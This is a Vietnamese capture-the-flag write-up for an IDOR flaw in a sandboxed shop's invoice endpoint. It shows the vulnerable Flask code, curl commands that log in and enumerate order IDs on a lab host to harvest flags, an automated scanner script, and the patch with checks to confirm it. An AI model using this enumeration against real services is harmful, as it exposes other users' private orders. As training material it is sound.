# 02 · IDOR — Hóa đơn đơn hàng

| | |
|---|---|
| **Khu vực** | Hóa đơn · `GET /account/orders/<id>/invoice` |
| **Cần đăng nhập** | Có (một tài khoản bất kỳ) |
| **Flag nằm ở** | `orders.memo` (ghi chú giao nhận của đơn) |
| **Script** | [`exploits/idor.py`](exploits/idor.py) |

## 1. Nhận dạng (black-box)

- Tạo tài khoản, đặt một đơn hàng, mở hóa đơn: URL là `/account/orders/<id>/invoice` với
  `<id>` là **số nguyên tuần tự, đoán được**.
- Thử đổi `<id>` sang một số khác (vd. `9001`, `9002`, ...): vẫn xem được hóa đơn **không phải
  của mình** ⇒ thiếu kiểm soát quyền truy cập theo đối tượng → **IDOR**.
- Dòng "Ghi chú giao nhận" trên hóa đơn in nội dung `memo` của đơn — nơi checker cắm flag.

## 2. Phân tích mã nguồn

[`sandbox/app/app.py`](../sandbox/app/app.py) · hàm `invoice` (≈ dòng 395–409):

```python
@app.get("/account/orders/<int:order_id>/invoice")
@user_required
def invoice(order_id):
    with connect(db_path) as db:
        order = db.execute("SELECT * FROM orders WHERE id=?", (order_id,)).fetchone()
        if not order:
            abort(404)
        if patched("idor") and order["user_id"] != session["uid"]:   # <-- chỉ kiểm tra khi đã vá
            abort(403)
        ...
    return page("Hóa đơn", invoice=order, invoice_items=lines)
```

- `@user_required` chỉ bắt buộc **đăng nhập**, không kiểm tra **quyền sở hữu đơn**.
- Khi chưa vá, kiểm tra `order["user_id"] != session["uid"]` bị bỏ qua ⇒ bất kỳ người dùng đăng
  nhập nào cũng đọc được hóa đơn của mọi đơn, chỉ cần biết `order_id`.
- `memo` được in ở [`templates/shop.html`](../sandbox/app/templates/shop.html) dòng 320:
  `Ghi chú giao nhận: {{ invoice.memo }}`.

**Khoảng id cần quét:** app seed sẵn một đơn mẫu id `9001`, nên các đơn do checker/đội tạo
tự tăng từ ~`9002` trở lên (và một ít đơn id nhỏ nếu có). Quét quanh `9001+` là trúng nhất.

## 3. Khai thác thủ công

```bash
# 1) Đăng ký + đăng nhập, giữ cookie phiên vào jar.txt
curl -s -c jar.txt -b jar.txt "http://10.90.0.12/register" \
  --data "username=atk$RANDOM&password=atk-passw0rd-123&name=atk&email=a@a.test" -o /dev/null
curl -s -c jar.txt -b jar.txt "http://10.90.0.12/login" \
  --data "username=atk...&password=atk-passw0rd-123" -o /dev/null

# 2) Quét id hóa đơn của người khác, lọc flag
for id in $(seq 9001 9300); do
  curl -s -b jar.txt "http://10.90.0.12/account/orders/$id/invoice" \
    | grep -oE 'MekoDataCTF\{[A-Z0-9]{30}\}'
done
```

## 4. Script tự động

[`exploits/idor.py`](exploits/idor.py) tự đăng ký + đăng nhập rồi quét dải id (mặc định
`9001..10200` và `1..399`), lọc flag từ mỗi hóa đơn:

```bash
python idor.py http://10.90.0.12            # dải mặc định
python idor.py http://10.90.0.12 9001 1500  # base, start=9001, span=1500
```

## 5. Bản vá

Bật khóa `idor`:

```json
{"idor": true}
```

Khi vá, server so `orders.user_id` với `session["uid"]`; khác chủ ⇒ trả **403**. (Chi tiết:
[PATCHES.md](PATCHES.md).)

**Tự kiểm chứng sau vá:**
- Xem hóa đơn **của chính mình** vẫn 200 (chức năng còn nguyên).
- Mở hóa đơn của đơn người khác ⇒ **403**; script `idor.py` trả **0 flag**.
- Checker IDOR vẫn UP (nó chỉ mở lại hóa đơn do chính tài khoản đó đặt).
